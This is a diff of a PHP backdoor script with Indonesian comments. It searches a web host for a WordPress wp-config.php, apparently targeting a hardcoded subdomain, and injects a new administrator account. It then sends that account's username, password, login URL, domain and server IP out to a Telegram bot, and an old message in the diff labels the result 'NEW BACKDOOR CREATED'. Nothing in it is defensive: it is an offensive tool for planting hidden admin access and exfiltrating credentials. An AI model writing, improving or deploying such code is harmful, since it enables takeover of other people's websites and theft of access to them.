@@ -9,41 +9,44 @@ $pass  = $_POST['wp_pass']  ?? 'Asdf1234@@';
 $email = $_POST['wp_email'] ?? 'admin@' . $_SERVER['HTTP_HOST'];
 
 // =============================================
-// AUTO DETECT SUBDOMAIN DARI LOKASI SCRIPT
+// AUTO DETECT & PRIORITY SUBDOMAIN
 // =============================================
-$currentDir = dirname(__FILE__);
-$target_subdomain = basename($currentDir);  // Ambil nama folder tempat script ini dijalankan
+$target_subdomain = 'bloglegalcops';   // GANTI INI kalau subdomainnya beda
 
+$currentDir = dirname(__FILE__);
 $found_config = false;
 
-// Priority 1: Cek wp-config di folder script saat ini
-if (file_exists($currentDir . '/wp-config.php')) {
-    $found_config = $currentDir . '/wp-config.php';
-}
+// 1. PRIORITY 1: Cek di folder subdomain target (meski script dijalankan dari mana saja)
+$possible_paths = [
+    $_SERVER['DOCUMENT_ROOT'] . '/' . $target_subdomain . '/wp-config.php',
+    $_SERVER['DOCUMENT_ROOT'] . '/' . $target_subdomain,
+    $currentDir . '/wp-config.php',
+    $currentDir . '/' . $target_subdomain . '/wp-config.php',
+];
 
-// Priority 2: Beberapa variasi path hosting umum
-if (!$found_config) {
-    $doc_root = $_SERVER['DOCUMENT_ROOT'] ?? '';
-    $paths_to_check = [
-        $currentDir . '/wp-config.php',
-        $currentDir . '/../wp-config.php',
-        $doc_root . '/' . $target_subdomain . '/wp-config.php',
-        dirname($doc_root) . '/' . $target_subdomain . '/wp-config.php',
-        $currentDir . '/../../wp-config.php',
-    ];
+// Tambah beberapa variasi path hosting
+$doc_root = $_SERVER['DOCUMENT_ROOT'];
+$paths_to_check = [
+    $doc_root . "/$target_subdomain/wp-config.php",
+    dirname($doc_root) . "/$target_subdomain/wp-config.php",
+    $doc_root . "/$target_subdomain/",
+    $currentDir,
+    $currentDir . "/..",
+    $currentDir . "/../..",
+];
 
-    foreach ($paths_to_check as $path) {
-        if (file_exists($path)) {
-            $found_config = $path;
-            break;
-        }
+foreach ($paths_to_check as $path) {
+    $check_file = is_dir($path) ? $path . '/wp-config.php' : $path;
+    if (file_exists($check_file)) {
+        $found_config = $check_file;
+        break;
     }
 }
 
-// Priority 3: Fallback scan naik directory
+// 2. Fallback scanning naik directory
 if (!$found_config) {
     $search_path = $currentDir;
-    for ($i = 0; $i < 10; $i++) {
+    for ($i = 0; $i < 12; $i++) {
         if (file_exists($search_path . '/wp-config.php')) {
             $found_config = $search_path . '/wp-config.php';
             break;
@@ -88,15 +91,12 @@ if ($found_config) {
                 $login_url = $siteurl . "/wp-login.php";
             }
 
-            // Telegram Notif
-            $text = "💎 *NEW BACKDOOR CREATED!* 💎\n\n";
+            // Telegram
+            $text = "💎 *INI YA LOGINAN WP NYA!* 💎\n\n";
             $text .= "👤 *User:* " . $user . "\n";
             $text .= "🔑 *Pass:* " . $pass . "\n";
             $text .= "🔗 *Login:* " . $login_url . "\n";
             $text .= "🌐 *Domain:* " . $domain . "\n";
-            $text .= "📁 *Subdomain:* " . $target_subdomain . "\n";
-            $text .= "🗃 *wp-config:* " . $found_config . "\n";
-            $text .= "📍 *Script Path:* " . __FILE__ . "\n";
             $text .= "🛰 *IP:* " . ($_SERVER['SERVER_ADDR'] ?? 'unknown') . "\n";
             $text .= "📅 *Time:* " . date('Y-m-d H:i:s') . "\n";
 
@@ -109,8 +109,8 @@ if ($found_config) {
             curl_close($ch);
 
             echo "✅ <b>SUCCESS!</b> Admin '$user' berhasil di-inject!<br>";
-            echo "🔗 <a href='$login_url' target='_blank'>Login Sekarang</a><br>";
-            echo "<small>Subdomain: <b>" . htmlspecialchars($target_subdomain) . "</b></small>";
+            echo "🔗 <a href='$login_url' target='_blank'>Klik untuk Login</a><br>";
+            echo "<small>wp-config digunakan: " . htmlspecialchars($found_config) . "</small>";
         } else {
             echo "ERROR Query: " . $conn->error;
         }
@@ -119,6 +119,6 @@ if ($found_config) {
         echo "DATABASE ERROR: " . $conn->connect_error;
     }
 } else {
-    echo "❌ wp-config.php tidak ditemukan di folder ini.";
+    echo "❌ wp-config.php tidak ditemukan. Cek nama subdomain di variabel \$target_subdomain.";
 }
 ?>
